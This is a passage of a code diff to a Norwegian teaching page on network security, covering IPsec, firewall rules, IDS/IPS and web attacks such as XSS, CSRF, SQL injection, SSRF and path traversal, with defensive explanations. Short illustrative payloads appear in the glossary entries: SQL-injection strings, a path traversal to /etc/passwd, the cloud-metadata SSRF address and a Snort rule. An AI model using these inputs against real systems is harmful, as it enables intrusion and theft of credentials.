+          ]}
+        />
         <Illustration caption="Tunnel-mode: hele original-pakken pakkes inn i en ny IP+ESP-pakke. De interne adressene er skjult.">
-        <IpsecTunnelSvg />
-      </Illustration>
+          <IpsecTunnelSvg />
+        </Illustration>
       </div>
+
+      <Hvorfor title="Hvorfor velger man tunnel-mode mellom kontorer, men transport-mode for host-til-host?">
+        <p>
+          Forskjellen handler om hva slags adressering som finnes på endepunktene. To kontor-LAN-er
+          har private adresser (10.x eller 192.168.x) som ikke kan rutes over internett. Hvis vi
+          bare krypterte payload-en og lot interne adresser stå i header (transport-mode), ville
+          mellomliggende rutere nektet å videresende pakken — de vet ikke hvor 10.0.2.7 ligger.
+          Tunnel-mode kapsler hele pakken inn i en ny ytre IP-header med de offentlige
+          gateway-adressene, så internett ser bare gateway-til-gateway-trafikk.
+        </p>
+        <p>
+          For to enkelt-hosts som allerede har offentlige, rutbare adresser (eks. to servere som vil
+          snakke trygt direkte) er det ingen grunn til å bære byrden av en ekstra IP-header på 20
+          byte per pakke. Transport-mode beholder den originale headeren og krypterer bare payload,
+          og er dermed mer effektivt. Som regel: hvis endepunktene snakker sammen via gateways som
+          beskytter andre, bruk tunnel; hvis de snakker direkte, bruk transport.
+        </p>
+      </Hvorfor>
 
       <Example title="Eksempel: når bør du velge tunnel-mode?">
         <p>
@@ -695,41 +1100,93 @@ function Section87() {
 
       <div className="grid gap-3 lg:grid-cols-2">
         <Defs
-        items={[
-          {
-            term: "Stateless pakkefilter",
-            body: "Ser på hver pakke for seg uten å huske noe fra før. Regelsett er en ordnet liste av (kilde, dest, port, protokoll, handling). Ekstremt rask og enkel, men kan ikke skille mellom «svar på en utgående forespørsel» og «uoppfordret innkommende pakke» — du må enten åpne portene for alltid eller stenge dem helt.",
-          },
-          {
-            term: "Stateful inspeksjon",
-            body: "Holder en tabell over aktive forbindelser. Når en intern host åpner TCP til en ekstern server (SYN ut), legges (src-IP, src-port, dst-IP, dst-port) inn i tabellen. Innkommende pakker matches mot tabellen; svar slippes inn, uoppfordrede pakker avvises. Default-policy kan dermed være «deny all incoming», men interne kan fortsatt åpne forbindelser ut.",
-          },
-          {
-            term: "Default deny",
-            body: "Beste-praksis-policy: alt som ikke eksplisitt er tillatt, blir avvist. Motsatt av «default allow» som krever at man tenker på alle mulige angrep — umulig. Med default deny gir man bare positive eksempler («tillat TCP/443 ut»).",
-          },
-          {
-            term: "Implicit deny ved slutten av regelsettet",
-            body: "Regler evalueres top-down, første match vinner. Helt nederst legges en eksplisitt «deny all» — slik at en pakke som ikke matchet noen regel ovenfor, fanges der i stedet for å slippe gjennom ved et uhell.",
-          },
-          {
-            term: "Applikasjons-brannmur (proxy)",
-            body: "Forstår innholdet i applikasjons-protokoller. En HTTP-proxy kan blokkere POST-er med bestemte mønstre eller cookies; en SMTP-proxy kan strippe ut farlige vedlegg. Mye dyrere per pakke enn pakkefilter, men kan stoppe ting et lavnivå-filter ikke ser.",
-          },
-          {
-            term: "Tunneling og smugling",
-            body: "Hvis brannmuren bare ser på port-nummer, kan angripere skjule trafikk i tillatte protokoller. SSH over port 443, eller en hel TCP-forbindelse inn i HTTPS via WebSocket. Forsvar: dyp pakke-inspeksjon eller TLS-terminering på en intern proxy som kan se trafikken etter dekryptering.",
-          },
-          {
-            term: "Egress-filtrering",
-            body: "Filtrering også av utgående trafikk. Mange organisasjoner glemmer dette og fokuserer bare på innkommende. Egress-regler stopper malware fra å eksfiltrere data eller koble seg til kommando-servere. Også god praksis: blokker utgående SMTP fra alt unntatt e-postserveren.",
-          },
-        ]}
-      />
+          items={[
+            {
+              term: "Stateless pakkefilter",
+              body: "Ser på hver pakke for seg uten å huske noe fra før. Regelsett er en ordnet liste av (kilde, dest, port, protokoll, handling). Ekstremt rask og enkel, men kan ikke skille mellom «svar på en utgående forespørsel» og «uoppfordret innkommende pakke» — du må enten åpne portene for alltid eller stenge dem helt.",
+            },
+            {
+              term: "Stateful inspeksjon",
+              body: "Holder en tabell over aktive forbindelser. Når en intern host åpner TCP til en ekstern server (SYN ut), legges (src-IP, src-port, dst-IP, dst-port) inn i tabellen. Innkommende pakker matches mot tabellen; svar slippes inn, uoppfordrede pakker avvises. Default-policy kan dermed være «deny all incoming», men interne kan fortsatt åpne forbindelser ut.",
+            },
+            {
+              term: "Default deny",
+              body: "Beste-praksis-policy: alt som ikke eksplisitt er tillatt, blir avvist. Motsatt av «default allow» som krever at man tenker på alle mulige angrep — umulig. Med default deny gir man bare positive eksempler («tillat TCP/443 ut»).",
+            },
+            {
+              term: "Implicit deny ved slutten av regelsettet",
+              body: "Regler evalueres top-down, første match vinner. Helt nederst legges en eksplisitt «deny all» — slik at en pakke som ikke matchet noen regel ovenfor, fanges der i stedet for å slippe gjennom ved et uhell.",
+            },
+            {
+              term: "Applikasjons-brannmur (proxy)",
+              body: "Forstår innholdet i applikasjons-protokoller. En HTTP-proxy kan blokkere POST-er med bestemte mønstre eller cookies; en SMTP-proxy kan strippe ut farlige vedlegg. Mye dyrere per pakke enn pakkefilter, men kan stoppe ting et lavnivå-filter ikke ser.",
+            },
+            {
+              term: "Tunneling og smugling",
+              body: "Hvis brannmuren bare ser på port-nummer, kan angripere skjule trafikk i tillatte protokoller. SSH over port 443, eller en hel TCP-forbindelse inn i HTTPS via WebSocket. Forsvar: dyp pakke-inspeksjon eller TLS-terminering på en intern proxy som kan se trafikken etter dekryptering.",
+            },
+            {
+              term: "Egress-filtrering",
+              body: "Filtrering også av utgående trafikk. Mange organisasjoner glemmer dette og fokuserer bare på innkommende. Egress-regler stopper malware fra å eksfiltrere data eller koble seg til kommando-servere. Også god praksis: blokker utgående SMTP fra alt unntatt e-postserveren.",
+            },
+            {
+              term: "Stateless vs stateful (forskjellen)",
+              body: "Stateless: regelsett uten hukommelse, hver pakke vurderes for seg. Krever at man åpner svar-portene (eks. høye tilfeldige porter 1024+) for innkommende. Stateful: ser TCP-handshake (SYN/SYN-ACK/ACK) og UDP-«flow» og legger til ephemeral-regler for svar automatisk. Stateful er standard i alt fra hjemmerutere til enterprise.",
+            },
+            {
+              term: "Connection-tracking-tabell",
+              body: "Datastrukturen som driver stateful inspeksjon. En rad per aktiv flow: (proto, src-IP, src-port, dst-IP, dst-port, tilstand, timer). TCP-flows beholdes til FIN/RST eller idle-timeout (timer); UDP «flows» eksisterer bare som idle-timer (typisk 30 s). Stor tabell tar mye minne — DoS-angrep kan fylle den opp.",
+            },
+            {
+              term: "Next-Generation Firewall (NGFW)",
+              body: "Kombinasjon av stateful pakkefilter + applikasjons-identifikasjon + IPS + ofte SSL-inspeksjon. Identifiserer applikasjoner basert på protokoll-signaturer og oppførsel, ikke bare port. Kan f.eks. blokkere Skype-trafikk selv om den prøver å bytte port for å skjule seg.",
+            },
+            {
+              term: "WAF (Web Application Firewall)",
+              body: "Spesialisert applikasjons-brannmur for HTTP/HTTPS. Forstår URL-er, parametere, headere, cookies. Inspekterer ofte for OWASP Top 10-mønstre — SQL-injeksjon, XSS, path-traversal. ModSecurity er klassisk open-source WAF; cloud-tjenester som Cloudflare, AWS WAF tilbyr managed varianter.",
+            },
+            {
+              term: "Default deny vs default allow",
+              body: "Default deny: alt som ikke eksplisitt er tillatt, blokkeres. Default allow: alt som ikke eksplisitt er blokkert, tillates. Sikkerhets-best-practice er default deny på innkommende. Default allow krever at man kan forutse alle mulige angrep og blokkere hver av dem — umulig.",
+            },
+            {
+              term: "DMZ (Demilitarized Zone)",
+              body: "Mellomliggende nettverks-segment for tjenester som må være tilgjengelig fra internett (web, mail, DNS). Brannmur slipper utenfra-trafikk inn i DMZ, men ikke videre inn i interne LAN. Hvis en server i DMZ kompromitteres, må angriperen bryte gjennom andre laget for å nå interne data.",
+            },
+            {
+              term: "Zero-trust og micro-segmentering",
+              body: "Moderne paradigme som forkaster perimeter-tankegang: «alt på innsiden er trygt» antas å være feil. Hver request, også internt, autentiseres og autoriseres eksplisitt. Micro-segmentering: hver workload har sin egen lille brannmur-policy basert på identitet, ikke IP.",
+            },
+            {
+              term: "Iptables/nftables-regel-syntaks",
+              body: "Linux-kjernens innebygde pakkefilter. nftables (moderne) erstatter iptables. Regler organiseres i tabeller (filter, nat) → kjeder (INPUT, FORWARD, OUTPUT) → individuelle regler. Eks: «iptables -A INPUT -p tcp --dport 22 -s 10.0.0.0/8 -j ACCEPT». Conntrack-modulen gir stateful-funksjonen.",
+            },
+          ]}
+        />
         <Illustration caption="Regel-evaluering i et pakkefilter — top-down match, første treff bestemmer, deny som siste regel.">
-        <FirewallRulesSvg />
-      </Illustration>
+          <FirewallRulesSvg />
+        </Illustration>
       </div>
+
+      <Hvorfor title="Hvorfor er stateful inspeksjon nesten alltid bedre enn stateless?">
+        <p>
+          Tenk på en intern bruker som henter en webside fra en utvendig server. TCP-håndtrykket er
+          klient: SYN, server: SYN-ACK, klient: ACK — etter det flyter data fritt begge veier.
+          Klientens kildeport er en ephemeral port (eks. 49152). En stateless brannmur som vil
+          tillate svar-pakkene må åpne ALLE høye porter (1024-65535) for innkommende trafikk fra
+          utlandet, fordi den ikke kan forutsi hvilken ephemeral-port klienten valgte. Det betyr i
+          praksis at hele interne LAN er åpent for skann fra utenfra på alle høye porter.
+        </p>
+        <p>
+          En stateful brannmur ser SYN-en gå ut, legger (klient-IP, 49152, server-IP, 80) inn i sin
+          conntrack-tabell, og ETTER det slipper bare gjennom innkommende pakker som matcher den
+          flow-en. Ingen åpne ephemeral-porter for verden — bare for det ene utgående
+          forbindelses-paret. Forskjellen er enorm i angreps-overflate, og den eneste reelle
+          kostnaden er minne for conntrack-tabellen. Derfor er stateless pakkefilter i dag bare
+          relevant for høyhastighets-edge der man ikke har tid til lookup, og selv der er det ofte
+          hardware-stateful.
+        </p>
+      </Hvorfor>
 
       <Example title="Eksempel: regelsett for en liten bedrift">
         <p>
@@ -754,6 +1211,47 @@ function Section87() {
         </p>
       </Example>
 
+      <Example title="Eksempel: regel-evaluering pakke for pakke">
+        <p>Vi har dette regelsettet (top-down, første match vinner):</p>
+        <pre className="mt-2 rounded bg-muted/30 p-2 font-mono text-[11px] overflow-x-auto">
+          {`1. allow tcp 10.0.0.0/24 -> any            port 80,443  (web ut)
+2. deny  tcp any         -> 10.0.0.50      port 22      (SSH til admin-server kun internt)
+3. allow tcp 10.0.0.0/24 -> 10.0.0.50      port 22      (intern SSH)
+4. allow tcp any         -> 10.0.0.80      port 80,443  (public web)
+5. allow tcp any         -> any            established  (svar)
+6. deny  any any         -> any                         (catch-all)`}
+        </pre>
+        <p className="mt-2">Trace for fire pakker:</p>
+        <ul className="list-disc pl-5 mt-1 space-y-1">
+          <li>
+            <strong>Pakke A:</strong> 10.0.0.7 → 1.1.1.1:443. Regel 1 matcher (src i 10.0.0.0/24,
+            dst-port 443). <em>Tillatt</em>. Conntrack legges til, så svaret slipper inn via regel
+            5.
+          </li>
+          <li>
+            <strong>Pakke B:</strong> 198.51.100.5 → 10.0.0.50:22 (SSH utenfra). Regel 1 matcher
+            ikke (src ikke i 10.0.0.0/24). Regel 2 matcher (src=any, dst=10.0.0.50, port=22).
+            <em> Avvist</em> før regel 3 ses.
+          </li>
+          <li>
+            <strong>Pakke C:</strong> 10.0.0.7 → 10.0.0.50:22 (intern SSH). Regel 1 matcher ikke
+            (port ikke 80/443). Regel 2 matcher dessverre OGSÅ — «any &rarr; 10.0.0.50:22» dekker
+            både interne og eksterne. <em>Avvist</em>. <strong>Feil rekkefølge!</strong> Regel 2 og
+            3 må byttes, så regel 3 (mer spesifikk) evalueres først.
+          </li>
+          <li>
+            <strong>Pakke D:</strong> 203.0.113.9 → 10.0.0.80:443 (legitim web-besøkende). Regel 1
+            matcher ikke. Regel 2 matcher ikke. Regel 3 matcher ikke. Regel 4 matcher.
+            <em> Tillatt</em>.
+          </li>
+        </ul>
+        <p className="mt-2 text-muted-foreground">
+          Lærdom: rekkefølge er semantisk. Spesifikke regler (engere kriterier) skal stå før
+          generelle. En av de vanligste konfigurasjons-feilene i pakkefilter er at en for tidlig
+          deny-regel slukker en senere allow.
+        </p>
+      </Example>
+
       <RelatedSlugs slugs={["dte2507-stateful-firewall", "dte2507-brannmur-pakkeflyt"]} />
     </article>
   );
@@ -775,41 +1273,101 @@ function Section88() {
 
       <div className="grid gap-3 lg:grid-cols-2">
         <Defs
-        items={[
-          {
-            term: "IDS (Intrusion Detection System)",
-            body: "Passivt system som inspiserer trafikken og varsler ved mistenkelig aktivitet. Påvirker ikke pakkeflyten — bare logger og varsler en operatør. Brukes ofte for å oppdage angrep man ikke har klart å forhindre.",
-          },
-          {
-            term: "IPS (Intrusion Prevention System)",
-            body: "Som IDS, men plassert in-line: kan også droppe eller blokkere ondsinnede pakker i sanntid. Risiko: false positives stopper legitim trafikk, så IPS-er kjøres ofte konservativt — bare høyt sikre mønstre blokkeres, resten bare logges.",
-          },
-          {
-            term: "Signatur-basert deteksjon",
-            body: "Sammenligner trafikken mot en database av kjente angreps-mønstre («signaturer»). Sterk side: lav false-positive-rate, nøyaktige varsler — du vet akkurat hva angrepet er. Svak side: ser bare angrep noen allerede har beskrevet; nye angrep og varianter glipper.",
-          },
-          {
-            term: "Anomali-basert deteksjon",
-            body: "Lærer hva «normal» trafikk ser ut som og varsler ved avvik. Kan fange ukjente angrep. Svak side: høyere false-positive-rate, og «normal» er en bevegelig baseline — endringer i bedriftens bruk gir falske varsler.",
-          },
-          {
-            term: "DPI (Deep Packet Inspection)",
-            body: "Inspeksjon av selve payload-innholdet, ikke bare header-feltene. Krever mye mer prosessering per pakke og blir vanskelig med TLS-kryptert trafikk. Mange organisasjoner setter opp en TLS-terminerende proxy internt for å kunne kjøre DPI.",
-          },
-          {
-            term: "False positive vs false negative",
-            body: "En FP er et varsel uten et reelt angrep (irriterende, bygger varsel-tretthet). En FN er et reelt angrep som glipper (farlig). Operatører må balansere reglene — for streng gir for mange FP, for slappe gir for mange FN.",
-          },
-          {
-            term: "Snort og Suricata",
-            body: "To populære open-source IDS/IPS-motorer. Bruker tekstuelle regler som beskriver pakke-mønstre («alert tcp any any -> $HOME_NET 80 (content: «/etc/passwd»; sid: 1001)»). Stort økosystem av ferdige regelsett (Emerging Threats, Talos).",
-          },
-        ]}
-      />
+          items={[
+            {
+              term: "IDS (Intrusion Detection System)",
+              body: "Passivt system som inspiserer trafikken og varsler ved mistenkelig aktivitet. Påvirker ikke pakkeflyten — bare logger og varsler en operatør. Brukes ofte for å oppdage angrep man ikke har klart å forhindre.",
+            },
+            {
+              term: "IPS (Intrusion Prevention System)",
+              body: "Som IDS, men plassert in-line: kan også droppe eller blokkere ondsinnede pakker i sanntid. Risiko: false positives stopper legitim trafikk, så IPS-er kjøres ofte konservativt — bare høyt sikre mønstre blokkeres, resten bare logges.",
+            },
+            {
+              term: "Signatur-basert deteksjon",
+              body: "Sammenligner trafikken mot en database av kjente angreps-mønstre («signaturer»). Sterk side: lav false-positive-rate, nøyaktige varsler — du vet akkurat hva angrepet er. Svak side: ser bare angrep noen allerede har beskrevet; nye angrep og varianter glipper.",
+            },
+            {
+              term: "Anomali-basert deteksjon",
+              body: "Lærer hva «normal» trafikk ser ut som og varsler ved avvik. Kan fange ukjente angrep. Svak side: høyere false-positive-rate, og «normal» er en bevegelig baseline — endringer i bedriftens bruk gir falske varsler.",
+            },
+            {
+              term: "DPI (Deep Packet Inspection)",
+              body: "Inspeksjon av selve payload-innholdet, ikke bare header-feltene. Krever mye mer prosessering per pakke og blir vanskelig med TLS-kryptert trafikk. Mange organisasjoner setter opp en TLS-terminerende proxy internt for å kunne kjøre DPI.",
+            },
+            {
+              term: "False positive vs false negative",
+              body: "En FP er et varsel uten et reelt angrep (irriterende, bygger varsel-tretthet). En FN er et reelt angrep som glipper (farlig). Operatører må balansere reglene — for streng gir for mange FP, for slappe gir for mange FN.",
+            },
+            {
+              term: "Snort og Suricata",
+              body: "To populære open-source IDS/IPS-motorer. Bruker tekstuelle regler som beskriver pakke-mønstre («alert tcp any any -> $HOME_NET 80 (content: «/etc/passwd»; sid: 1001)»). Stort økosystem av ferdige regelsett (Emerging Threats, Talos).",
+            },
+            {
+              term: "NIDS vs HIDS",
+              body: "NIDS (Network IDS): inspiserer pakker på lenken. Ser hele organisasjonens trafikk, men ikke innhold av kryptert trafikk eller hva som faktisk skjer på endepunktene. HIDS (Host IDS): kjører på selve hosten. Ser system-kall, fil-endringer, registry-endringer. Krever agent på hver host, men ser ting NIDS ikke kan.",
+            },
+            {
+              term: "SPAN-port (Switched Port Analyzer)",
+              body: "Konfigurasjon på switch der trafikk fra én eller flere porter speiles ut til en analyse-port. IDS-en kobles dit og ser kopi av all interessant trafikk uten å være in-line. Lavt risiko (kan ikke selv blokkere ved feil), men også ute av stand til å stoppe angrep i sanntid.",
+            },
+            {
+              term: "Network TAP",
+              body: "Fysisk eller virtuell enhet som setter seg i en lenke og kopierer alle pakker ut. Mer pålitelig enn SPAN-port (tar ikke skade av switch-overbelastning) og brukes der ekte fullstendig sikkerhets-mon krever 100 % pakke-fangst.",
+            },
+            {
+              term: "False-positive-rate (FPR) og presisjon",
+              body: "FPR = andel godkjent trafikk som likevel utløser alarm. Presisjon = andel alarmer som faktisk er angrep. Begge avhenger av rate of attacks. Selv en 99 % nøyaktig detektor i et nett med 1 angrep per million pakker vil generere overveldende mange falske alarmer — Bayes' setning slår beinhardt.",
+            },
+            {
+              term: "Alarm-tretthet",
+              body: "Operatør-fenomen der mange falske alarmer fører til at ekte alarmer ignoreres. Studier av store SOC-er viser at >50 % av alarmer aldri følges opp. Forsvar: tune regler aggressivt, korreler alarmer fra ulike kilder, prioriter på alvorlighetsgrad.",
+            },
+            {
+              term: "EDR (Endpoint Detection and Response)",
+              body: "Moderne HIDS-arvtagere: kjører på endepunkt, samler telemetri (prosess-trær, nettverks-koblinger, fil-tilganger) til en sentral analyse-tjeneste. Bruker både regler og ML-baseline. Crowdstrike, SentinelOne, Microsoft Defender for Endpoint er kommersielle eksempler.",
+            },
+            {
+              term: "SIEM (Security Information and Event Management)",
+              body: "Sentralisert plattform som samler logger fra brannmur, IDS, EDR, autentiserings-systemer, applikasjoner. Korrelerer hendelser på tvers, kjører regler som spenner kilder («mistenkelig login + database-dump i etterkant»). Splunk, Elastic SIEM, Microsoft Sentinel er typiske.",
+            },
+            {
+              term: "Honeypot og deception",
+              body: "Falsk system designet for å lokke til seg angripere. All trafikk til det er per definisjon mistenkelig — ingen legitime brukere skal ha kontakt med en honeypot. Gir høy presisjon på alarmene og innsikt i angreps-teknikker. Brukes også til å forsinke pågående angrep.",
+            },
+            {
+              term: "Begrensninger i kryptert verden",
+              body: "TLS-kryptering gjør DPI praktisk umulig uten at IDS terminerer TLS internt (egne sertifikater på klientene). Mange organisasjoner setter opp en TLS-terminerende proxy på utkanten av nett for å gjøre IDS-deteksjon. Personvern-tradeoff: nå ser bedriften innholdet i alle ansattes web-trafikk.",
+            },
+            {
+              term: "Kill chain og MITRE ATT&CK",
+              body: "Rammeverk for å beskrive angrep i faser: rekognosering, initial access, execution, persistence, privilege escalation, defense evasion, credential access, discovery, lateral movement, collection, exfiltration. MITRE ATT&CK er et detaljert taksonomi-rammeverk som mappet TTP-er (Tactics, Techniques, Procedures). IDS-regler taggges ofte mot ATT&CK-ID-er.",
+            },
+          ]}
+        />
         <Illustration caption="IDS sniffer trafikken via et SPAN-port og varsler operatøren. IPS sitter in-line og kan blokkere.">
-        <IdsIpsSvg />
-      </Illustration>
+          <IdsIpsSvg />
+        </Illustration>
       </div>
+
+      <Hvorfor title="Hvorfor har signatur-basert IDS lav false-positive men anomali-basert høy?">
+        <p>
+          Signatur-basert deteksjon bygger på et eksplisitt mønster — typisk en konkret byte-sekvens
+          eller et regex som matcher kjent angreps-kode (eks. <code>/etc/passwd</code> i en
+          HTTP-URI, en spesifikk shellcode-sekvens). Hvis mønsteret er tett nok knyttet til
+          angrepet, vil normal trafikk svært sjelden matche tilfeldig — false-positive-raten er lav.
+          Prisen er at du kun ser angrep noen allerede har skrevet en signatur for; en angriper som
+          varierer payload-en eller bruker et helt nytt exploit, glipper.
+        </p>
+        <p>
+          Anomali-basert deteksjon bygger en statistisk modell av «normal» trafikk og varsler på
+          avvik. Den fanger ukjente angrep, men har et grunnleggende problem: «normal» er en
+          bevegelig baseline. En ny CRM-deploy, sesong-skift, eller bare en innleid konsulent som
+          gjør noe uvanlig, vil utløse alarm. Selv 1 % falske positive på milliarder av pakker per
+          dag betyr titusener av alarmer å sile gjennom. I praksis bruker organisasjoner derfor
+          signatur-basert som forsvarslinje, anomali-basert for å oppdage avvik som krever manuell
+          analyse, og EDR/SIEM-korrelasjon for å løfte presisjonen.
+        </p>
+      </Hvorfor>
 
       <Example title="Eksempel: en enkel Snort-regel">
         <pre className="rounded bg-muted/30 p-2 font-mono text-[11px] overflow-x-auto">
@@ -848,41 +1406,110 @@ function Section89() {
 
       <div className="grid gap-3 lg:grid-cols-2">
         <Defs
-        items={[
-          {
-            term: "XSS (Cross-Site Scripting)",
-            body: "Angriperen klarer å få sin egen JavaScript til å kjøre i en annen brukers nettleser, i konteksten av et legitimt nettsted. Stjeler typisk session-cookies eller spiller av handlinger som brukeren. Tre varianter: stored (skript lagres i database), reflected (skript ekkes tilbake fra URL) og DOM-based (skript injiseres via klient-side parsing).",
-          },
-          {
-            term: "XSS-forsvar",
-            body: "Kontekst-bevisst escaping av all brukerdata før den settes inn i HTML, og en streng Content-Security-Policy (CSP) som forbyr inline scripts og kun tillater skript fra spesifikke origins. innerHTML-tilordninger med ukontrollert input er en magnet for XSS — bruk textContent eller en escape-funksjon.",
-          },
-          {
-            term: "CSRF (Cross-Site Request Forgery)",
-            body: "Angriperen lurer offerets nettleser til å sende en forespørsel mot et annet domene der offeret allerede er innlogget. F.eks. en skjult form på evil.com som POST-er til bank.no/overforing. Nettleseren legger automatisk ved bank.no-cookies, og banken tror forespørselen er legitim.",
-          },
-          {
-            term: "CSRF-forsvar",
-            body: "(1) CSRF-tokens: server genererer et tilfeldig tokens per sesjon, embedder det i alle skjemaer, og krever det ved hver state-changing request. Evil.com kan ikke gjette tokenet. (2) SameSite-cookies: nettleseren slutter å sende cookies på cross-site requests. (3) Origin/Referer-header-sjekk.",
-          },
-          {
-            term: "SQL-injeksjon",
-            body: "Brukerdata konkateneres inn i en SQL-streng uten parameter-binding, slik at angriperen kan endre selve spørringen. Klassisk: «SELECT * FROM users WHERE name='» + input + «'» — sett input til «' OR 1=1 --» og hele tabellen returneres.",
-          },
-          {
-            term: "SQL-injeksjon-forsvar",
-            body: "Bruk forberedte spørringer (prepared statements) med parameter-binding overalt. Da behandles brukerdata som data, aldri som SQL-syntaks. Stored procedures og ORM-er gir samme beskyttelse hvis de ikke har emergency-escape-luker. Validering av input er bare ekstra-belte, ikke selve forsvaret.",
-          },
-          {
-            term: "OWASP Top 10",
-            body: "Liste over de ti mest kritiske web-applikasjons-risikoene, oppdatert hvert par år. Injeksjons-angrep og broken access control har vært på topp i flere år. Bruk den som sjekkliste i kode-review og når man bygger trusselsmodell for en applikasjon.",
-          },
-        ]}
-      />
+          items={[
+            {
+              term: "XSS (Cross-Site Scripting)",
+              body: "Angriperen klarer å få sin egen JavaScript til å kjøre i en annen brukers nettleser, i konteksten av et legitimt nettsted. Stjeler typisk session-cookies eller spiller av handlinger som brukeren. Tre varianter: stored (skript lagres i database), reflected (skript ekkes tilbake fra URL) og DOM-based (skript injiseres via klient-side parsing).",
+            },
+            {
+              term: "XSS-forsvar",
+              body: "Kontekst-bevisst escaping av all brukerdata før den settes inn i HTML, og en streng Content-Security-Policy (CSP) som forbyr inline scripts og kun tillater skript fra spesifikke origins. innerHTML-tilordninger med ukontrollert input er en magnet for XSS — bruk textContent eller en escape-funksjon.",
+            },
+            {
+              term: "CSRF (Cross-Site Request Forgery)",
+              body: "Angriperen lurer offerets nettleser til å sende en forespørsel mot et annet domene der offeret allerede er innlogget. F.eks. en skjult form på evil.com som POST-er til bank.no/overforing. Nettleseren legger automatisk ved bank.no-cookies, og banken tror forespørselen er legitim.",
+            },
+            {
+              term: "CSRF-forsvar",
+              body: "(1) CSRF-tokens: server genererer et tilfeldig tokens per sesjon, embedder det i alle skjemaer, og krever det ved hver state-changing request. Evil.com kan ikke gjette tokenet. (2) SameSite-cookies: nettleseren slutter å sende cookies på cross-site requests. (3) Origin/Referer-header-sjekk.",
+            },
+            {
+              term: "SQL-injeksjon",
+              body: "Brukerdata konkateneres inn i en SQL-streng uten parameter-binding, slik at angriperen kan endre selve spørringen. Klassisk: «SELECT * FROM users WHERE name='» + input + «'» — sett input til «' OR 1=1 --» og hele tabellen returneres.",
+            },
+            {
+              term: "SQL-injeksjon-forsvar",
+              body: "Bruk forberedte spørringer (prepared statements) med parameter-binding overalt. Da behandles brukerdata som data, aldri som SQL-syntaks. Stored procedures og ORM-er gir samme beskyttelse hvis de ikke har emergency-escape-luker. Validering av input er bare ekstra-belte, ikke selve forsvaret.",
+            },
+            {
+              term: "OWASP Top 10",
+              body: "Liste over de ti mest kritiske web-applikasjons-risikoene, oppdatert hvert par år. Injeksjons-angrep og broken access control har vært på topp i flere år. Bruk den som sjekkliste i kode-review og når man bygger trusselsmodell for en applikasjon.",
+            },
+            {
+              term: "Stored XSS (persistent)",
+              body: "Angriperen lagrer skriptet i applikasjonens database — kommentarfelt, brukerprofil, forum-innlegg. Hver fremtidig leser eksekverer det. Mest skadelig variant fordi den treffer alle brukere som ser den infiserte siden, uten at angriperen trenger å lokke dem til en spesiell URL.",
+            },
+            {
+              term: "Reflected XSS",
+              body: "Skriptet er i URL-en og «reflekteres» tilbake usanitisert i HTML-svaret. Krever at angriper får offeret til å klikke en spesiallaget lenke (typisk via phishing). Eksempel: <code>site.no/search?q=&lt;script&gt;...&lt;/script&gt;</code> hvor søkestrengen ekkes uten escaping.",
+            },
+            {
+              term: "DOM-based XSS",
+              body: "Hele angrepet skjer i klient-side JavaScript — serveren returnerer trygg HTML, men noe JS plukker opp <code>location.hash</code> eller URL-parameter og setter det inn i DOM via innerHTML. Server-loggene ser ingen ondskap; bare nettleser-instrumentering eller kode-audit finner det.",
+            },
+            {
+              term: "Content Security Policy (CSP)",
+              body: "HTTP-header som forteller nettleseren hvilke kilder JS, CSS, bilder etc. får hentes fra. <code>Content-Security-Policy: script-src 'self' https://apis.google.com</code> stopper alle skript fra ukjente origins, inkludert injiserte inline-skripts. Krever streng disiplin — ingen <code>onclick=...</code>-attributter i HTML.",
+            },
+            {
+              term: "SameSite-cookies",
+              body: "Cookie-attributt som styrer om nettleseren skal sende cookien på cross-site requests. <code>Strict</code>: aldri. <code>Lax</code> (default nå): bare på top-level navigation (klikk på lenke). <code>None</code>: alltid (men krever Secure). Lax + tokens stopper de fleste CSRF-angrep.",
+            },
+            {
+              term: "CSRF-token-implementasjon",
+              body: "Standard mønster: server genererer kryptografisk tilfeldig token, lagrer i bruker-sesjonen, embedder det som skjult input i alle skjemaer. Ved POST sammenligner server token i forms-data mot sesjon. Double-submit-cookie er en variant uten server-state: token settes som cookie OG i form, server sammenligner.",
+            },
+            {
+              term: "SQL-injeksjons-typer",
+              body: "(1) Klassisk in-band: angriperen ser resultatet direkte i svaret. (2) Blind boolean-based: utleder bit for bit via om svaret er forskjellig (eks. true/false-side). (3) Blind time-based: <code>WHERE x = ' OR (SELECT SLEEP(5))</code> — målt forsinkelse avslører svar. (4) Out-of-band: data eksfiltreres via en separat kanal (DNS-oppslag fra serveren).",
+            },
+            {
+              term: "Prepared statements / parameter-binding",
+              body: "Databasen får SQL-strengen med <code>?</code>-placeholders og verdiene som adskilte argumenter. Driveren binder dem på protokoll-nivå — verdiene kan aldri tolkes som SQL-syntaks. Stopper SQL-injeksjon fullstendig. ORM-er bruker dette under panseret.",
+            },
+            {
+              term: "Server-Side Request Forgery (SSRF)",
+              body: "Applikasjonen henter en URL angitt av bruker (eks. «importer profilbilde fra denne URL-en»). Angriperen får serveren til å hente fra interne IP-er — <code>http://169.254.169.254/</code> avslører cloud-metadata med IAM-credentials. Forsvar: validér URL-mål, blokker private IP-rom og DNS-rebinding.",
+            },
+            {
+              term: "Path traversal",
+              body: "Bruker-input legges inn i filsti uten validering: <code>open('/var/www/uploads/' + filename)</code> der filename = <code>'../../etc/passwd'</code>. Leser sensitive filer utenfor tiltenkt katalog. Forsvar: validér at resolved path er prefiks av tillatt katalog, ikke bare strip <code>..</code>.",
+            },
+            {
+              term: "Click-jacking og X-Frame-Options",
+              body: "Angriperens side innebed offerets nettsted i en usynlig iframe og lokker offer til å klikke på det de tror er en del av angriperens side, men som faktisk er en knapp i offerets innloggede sesjon. Forsvar: <code>X-Frame-Options: DENY</code> eller CSP <code>frame-ancestors 'none'</code>.",
+            },
+            {
+              term: "Sub-resource Integrity (SRI)",
+              body: "Når du laster ekstern JS (CDN) kan du oppgi en hash av forventet innhold: <code>&lt;script integrity=&quot;sha384-...&quot;&gt;</code>. Hvis CDN-en kompromitteres og bytter ut skriptet, matcher ikke hashen og nettleseren nekter å kjøre det. Lite kost, stort gevinst mot supply-chain-angrep.",
+            },
+          ]}
+        />
         <Illustration caption="CSRF-flyt: offer er innlogget på bank, besøker evil.com som POST-er til bank med offerets cookies.">
-        <CsrfSvg />
-      </Illustration>
+          <CsrfSvg />
+        </Illustration>
       </div>
+
+      <Hvorfor title="Hvorfor er prepared statements det eneste forsvaret som faktisk fungerer mot SQL-injeksjon?">
+        <p>
+          Mange utviklere prøver først å «sanitisere» bruker-input — sjekke for farlige tegn, escape
+          apostrofer, blokkere ord som DROP eller UNION. Det er nesten alltid utilstrekkelig.
+          Eksempler: en numerisk parameter forventes uten anførsel, så input <code>1 OR 1=1</code>
